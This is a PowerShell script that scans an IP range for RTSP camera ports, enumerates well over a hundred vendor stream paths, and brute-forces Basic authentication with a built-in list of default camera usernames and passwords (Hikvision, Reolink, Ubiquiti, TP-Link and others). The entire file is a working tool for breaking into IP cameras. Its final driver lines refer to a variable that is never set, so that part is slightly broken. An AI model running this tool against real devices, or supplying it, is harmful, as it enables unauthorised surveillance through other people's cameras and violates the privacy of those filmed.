#Function to Get Valid IP address ranges when supplied with a CIDR
function Get-IpRange {
        [CmdletBinding(ConfirmImpact = 'None')]
        Param(
            [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
            [string[]] $Target
        )

        process {
            $Computers = @()
            foreach ($subnet in $Target) {
                if ($subnet -match '^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$') {
                    # Treat as a single IP address
                    $Computers += $subnet
                }
                elseif ($subnet -match '^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}/\b(1[6-9]|2[0-9]|3[0-2])\b$') {
                    # CIDR notation processing
                    $IP = ($subnet -split '\/')[0]
                    [int]$SubnetBits = ($subnet -split '\/')[1]
                    if ($SubnetBits -lt 16 -or $SubnetBits -gt 30) {
                        Write-Warning -Message 'Enter a CIDR value between 16 and 30'
                        return
                    }
                    $Octets = $IP -split '\.'
                    $IPInBinary = @()
                    foreach ($Octet in $Octets) {
                        $OctetInBinary = [convert]::ToString($Octet, 2).PadLeft(8, '0')
                        $IPInBinary += $OctetInBinary
                    }
                    $IPInBinary = $IPInBinary -join ''
                    $HostBits = 32 - $SubnetBits
                    $NetworkIDInBinary = $IPInBinary.Substring(0, $SubnetBits)

                    $imax = [convert]::ToInt32(('1' * $HostBits), 2) - 1 # -1 to remove broadcast address
                    For ($i = 1; $i -le $imax; $i++) {
                        $NextHostIDInDecimal = $i
                        $NextHostIDInBinary = [convert]::ToString($NextHostIDInDecimal, 2).PadLeft($HostBits, '0')
                        $NextIPInBinary = $NetworkIDInBinary + $NextHostIDInBinary
                        $IP = @()
                        For ($x = 0; $x -lt 4; $x++) {
                            $StartCharNumber = $x * 8
                            $IPOctetInBinary = $NextIPInBinary.Substring($StartCharNumber, 8)
                            $IPOctetInDecimal = [convert]::ToInt32($IPOctetInBinary, 2)
                            $IP += $IPOctetInDecimal
                        }
                        $IP = $IP -join '.'
                        $Computers += $IP
                    }
                }
                else {
                    Write-Host -ForegroundColor red "Value`: [$subnet] is not in a valid format"
                    return
                }
            }
            # Remember: Only returns an IP list, not active hosts.
            return $Computers
        }
}

function GenerateCreds {

    $UserList = @("Admin", "admin", "admin1", "administrator", "Administrator",
                "aiphone", "root", "Root", "service", "supervisor", "ubnt"
                )

    $PassList = @("", "0000", "00000", "1111", "111111", "1111111",
                "123", "1234", "12345", "123456", "1234567", "12345678",
                "123456789", "12345678910", "4321", "666666", "6fJjMKYx",
                "888888", "9999", "admin", "admin pass", "Admin", "admin123",
                "administrator", "Administrator", "aiphone", "camera",
                "Camera", "fliradmin", "GRwvcj8j", "hikvision", "hikadmin",
                "HuaWei123", "ikwd", "jvc", "kj3TqCWv", "meinsm", "pass",
                "Pass", "password", "password123", "qwerty", "qwerty123",
                "Recorder", "reolink", "root", "service", "supervisor",
                "support", "system", "tlJwpbo6", "toor", "tp-link", "ubnt",
                "user", "wbox", "wbox123", "Y5eIMz3C"
                )

    $authString = @()

                foreach ($user in $UserList){
                    foreach ($pass in $PassList) {
                    $authString += [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$user`:$pass")) 
                    }              
                }

    Write-Host -NoNewline -ForegroundColor Green "[+] "
    Write-Host -NoNewline "Creds Total: "
    Write-Host -ForegroundColor Green $authString.Count
    return $authString
}

function Get-OpenRTSPPorts {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory, ValueFromPipeline)]
        [string[]]$IPAddress
    )

    process {
        foreach ($ip in $IPAddress) {
            $openPorts = @()
            $ports = 554, 8554, 5554

            foreach ($port in $ports) {
                try {
                    $tcpClient = New-Object System.Net.Sockets.TcpClient
                    $tcpClient.SendTimeout = 200  # Set a timeout of 1 second
                    $tcpClient.ReceiveTimeout = 200
                    $awaitResult = $tcpClient.BeginConnect($ip, $port, $null, $null)
                    $success = $awaitResult.AsyncWaitHandle.WaitOne(1000, $false)

                    if ($success) {
                        $tcpClient.EndConnect($awaitResult)
                        if ($tcpClient.Connected) {
                            $openPorts += $port
                            $tcpClient.Close()
                        }
                    }
                }
                catch {
                    Write-Warning "An error occurred: $_"
                }
                finally {
                    if ($tcpClient.Connected) {
                        $tcpClient.Dispose()
                    }
                }
            }

            if ($openPorts.Count -gt 0) {
                foreach ($port in $openPorts) {
                    [PSCustomObject]@{
                        IPAddress = $ip
                        Port      = $port
                        Status    = "Open"
                    }
                }
            }
        }
    }
}

function Get-ValidRTSPPaths {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [PSCustomObject[]]$OpenPorts
    )

    $Paths = @( "", "MyStream", "/live/ch01_0", "0/1", "1/main", "0/video1", "1", "1.AMP", "1/h264major", "1/stream1",
    "11", "12", "125", "1080p", "1440p", "480p", "4K", "666", "720p", "AVStream1_1", "CAM_ID.password.mp2",
    "CH001.sdp", "GetData.cgi", "HD", "HighResolutionVideo", "LowResolutionVideo", "MediaInput/h264",
    "MediaInput/mpeg4", "ONVIF/MediaInput", "StdCh1", "Streaming/Channels/1", "Streaming/Unicast/channels/101",
    "VideoInput/1/h264/1", "VideoInput/1/mpeg4/1", "access_code", "access_name_for_stream_1_to_5",
    "api/mjpegvideo.cgi", "av0_0", "av2", "avc", "avn=2", "axis-media/media.amp", "axis-media/media.amp?camera=1",
    "axis-media/media.amp?videocodec=h264", "cam", "cam/realmonitor", "cam/realmonitor?channel=0&subtype=0",
    "cam/realmonitor?channel=1&subtype=0", "cam/realmonitor?channel=1&subtype=1",
    "cam/realmonitor?channel=1&subtype=1&unicast=true&proto=Onvif", "cam0", "cam0_0", "cam0_1", "cam1",
    "cam1/h264", "cam1/h264/multicast", "cam1/mjpeg", "cam1/mpeg4", "cam1/mpeg4?user='username'&pwd='password'",
    "cam1/onvif-h264", "camera.stm", "ch0", "ch00/0", "ch001.sdp", "ch01.264", "ch01.264?", "ch01.264?ptype=tcp",
    "ch1_0", "ch2_0", "ch3_0", "ch4_0", "ch1/0", "ch2/0", "ch3/0", "ch4/0", "ch0_0.h264", "ch0_unicast_firststream",
    "ch0_unicast_secondstream", "ch1-s1", "channel1", "gnz_media/main", "h264", "h264.sdp", "h264/ch1/sub/av_stream",
    "h264/media.amp", "h264Preview_01_main", "h264Preview_01_sub", "h264_vga.sdp", "h264_stream", "image.mpg", "img/media.sav",
    "img/media.sav?channel=1", "img/video.asf", "img/video.sav", "ioImage/1", "ipcam.sdp", "ipcam_h264.sdp", "ipcam_mjpeg.sdp",
    "live", "live.sdp", "live/av0", "live/ch0", "live/ch00_0", "live/ch01_0", "live/h264", "live/main", "live/main0", "live/mpeg4",
    "live1.sdp", "live3.sdp", "live_mpeg4.sdp", "live_st1", "livestream", "main", "media", "media.amp", "media.amp?streamprofile=Profile1",
    "media/media.amp", "media/video1", "medias2", "mjpeg/media.smp", "mp4", "mpeg/media.amp", "mpeg4", "mpeg4/1/media.amp",
    "mpeg4/media.amp", "mpeg4/media.smp", "mpeg4unicast", "mpg4/rtsp.amp", "multicaststream", "now.mp4", "nph-h264.cgi",
    "nphMpeg4/g726-640x", "nphMpeg4/g726-640x48", "nphMpeg4/g726-640x480", "nphMpeg4/nil-320x240", "onvif-media/media.amp",
    "onvif1", "play1.sdp", "play2.sdp", "profile1/media.smp", "profile2/media.smp", "profile5/media.smp", "rtpvideo1.sdp", "rtsp_live0", "rtsp_live1",
    "rtsp_live2", "rtsp_tunnel", "rtsph264", "rtsph2641080p", "snap.jpg", "stream", "stream/0", "stream/1", "stream/live.sdp",
    "stream.sdp", "stream1", "streaming/channels/0", "streaming/channels/1", "streaming/channels/101", "tcp/av0_0", "test",
    "tmpfs/auto.jpg", "trackID=1", "ucast/11", "udpstream", "user.pin.mp2", "v2", "video", "video.3gp", "video.h264", "video.mjpg",
    "video.mp4", "video.pro1", "video.pro2", "video.pro3", "video0", "video0.sdp", "video1", "video1.sdp",
    "videoMain", "videoinput_1/h264_1/media.stm", "videostream.asf", "vis", "wfov"
    )
    $authRequiredPaths = @()

    foreach ($openPort in $OpenPorts) {
        $ip = $openPort.IPAddress
        $port = $openPort.Port
        $validPathFound = $false

        foreach ($path in $Paths) {
            if ($validPathFound) { continue }  # Skip if a valid path is already found

            $CRLF = [char]13 + [char]10
            $request = "DESCRIBE rtsp://$ip`:$port/$path RTSP/1.0$CRLF" +
                       "CSeq: 2$CRLF$CRLF"

            try {
                $tcpClient = New-Object System.Net.Sockets.TcpClient
                $tcpClient.ReceiveTimeout = 100
                $tcpClient.Connect($ip, $port)

                $stream = $tcpClient.GetStream()
                $writer = New-Object System.IO.StreamWriter($stream)
                $writer.Write($request)
                $writer.Flush()

                $reader = New-Object System.IO.StreamReader($stream)
                $statusLine = $reader.ReadLine()

                if ($statusLine -match 'RTSP/1.0 200 OK') {
                    Write-Host "Path $path on $ip`:$port does not require authentication"
                    $validPathFound = $true
                }
                elseif ($statusLine -match 'RTSP/1.0 401 Unauthorized' -or $statusLine -match 'RTSP/1.0 403 Forbidden') {
                    $authRequiredPaths += [PSCustomObject]@{
                        IPAddress = $ip
                        Port      = $port
                        Path      = $path
                    }
                }
            }
            catch {
                Write-Warning "An error occurred: $_"
            }
            finally {
                if ($tcpClient.Connected) {
                    $tcpClient.Dispose()
                }
            }
        }
    }

    return $authRequiredPaths
}

function Get-ValidRTSPCredential {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$IP,
        [Parameter(Mandatory)]
        [int]$Port,
        [Parameter(Mandatory)]
        [string]$Path,
        [Parameter(Mandatory)]
        [string[]]$Credentials
    )

    foreach ($cred in $Credentials) {
        $validCred = Test-RTSPAuth -IP $IP -Port $Port -Path $Path -Credential $cred
        if ($validCred) {
            return $validCred
        }
    }

    return $null
}

function Test-RTSPAuth {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$IP,
        [Parameter(Mandatory)]
        [int]$Port,
        [Parameter(Mandatory)]
        [string]$Path,
        [Parameter(Mandatory)]
        [string[]]$Credentials
    )

    foreach ($cred in $Credentials) {
        $CRLF = [char]13 + [char]10

        $request = "DESCRIBE rtsp://$IP`:$Port/$Path RTSP/1.0$CRLF" +
                   "CSeq: 2$CRLF" +
                   "Authorization: Basic $cred$CRLF$CRLF"

        try {
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $tcpClient.ReceiveTimeout = 100  # Set a timeout of 100ms
            $tcpClient.Connect($IP, $Port)

            $stream = $tcpClient.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.Write($request)
            $writer.Flush()

            $reader = New-Object System.IO.StreamReader($stream)
            $statusLine = $reader.ReadLine()

            if ($statusLine -match 'RTSP/1.0 200 OK') {
                $reader.Dispose()
                $writer.Dispose()
                $stream.Dispose()
                $tcpClient.Dispose()

                $credential = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cred))
                
                return $credential
            }
            elseif ($statusLine -match 'RTSP/1.0 401 Unauthorized' -or $statusLine -match 'RTSP/1.0 403 Forbidden') {
                $reader.Dispose()
                $writer.Dispose()
                $stream.Dispose()
                $tcpClient.Dispose()
            }
        }
        catch [System.Net.Sockets.SocketException] {
            Write-Warning "Connection refused by $IP`:$Port for path $Path"
        }
        catch {
            Write-Warning "An error occurred: $_"
        }
        finally {
            if ($tcpClient.Connected) {
                $tcpClient.Dispose()
            }
        }
    }

    return $null

}



$ipRange = Get-IpRange -Target '192.168.0.219'
$openPorts = Get-OpenRTSPPorts -IPAddress $ipRange
$authRequiredPaths = Get-ValidRTSPPaths -OpenPorts $openPorts

$credentials = GenerateCreds


$validCred = Test-RTSPAuth -IP $authPath.IPAddress -Port $authPath.Port -Path $authPath.Path -Credentials $credentials
if ($validCred) {
    Write-Host "Valid credential found for $($authPath.IPAddress):$($authPath.Port)/$($authPath.Path): $validCred"
}
